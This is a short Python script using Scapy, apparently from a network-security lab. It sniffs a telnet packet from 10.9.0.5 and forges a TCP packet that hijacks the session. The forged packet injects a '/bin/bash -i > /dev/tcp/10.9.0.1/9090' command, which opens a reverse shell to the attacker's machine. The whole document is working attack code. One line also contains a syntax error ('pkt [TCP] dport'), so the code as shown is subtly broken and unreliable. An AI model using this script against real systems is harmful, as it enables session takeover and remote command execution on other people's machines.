#!/usr/bin/python3
from scapy.all import *
def spoof_tcp (pkt) :
  IPLayer = IP(dst=pkt[IP].src, src=pkt[IP].dst)
  TCPLayer = TCP(flags="A" ,
  seq=pkt [TCP].ack,ack=pkt[TCP].seq,
  dport=pkt[TCP].sport, sport=pkt [TCP] dport)
  data= "\r/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r"
  spoofpkt = IPLayer/TCPLayer/data
  ls(spoofpkt)
  send (spoofpkt, verbose=0)
pkt=sniff(iface = 'br-5b0cbd14ca3b', filter='tcp and port 23 and src 10.9.0.5', prn=spoof_tcp, count=1)
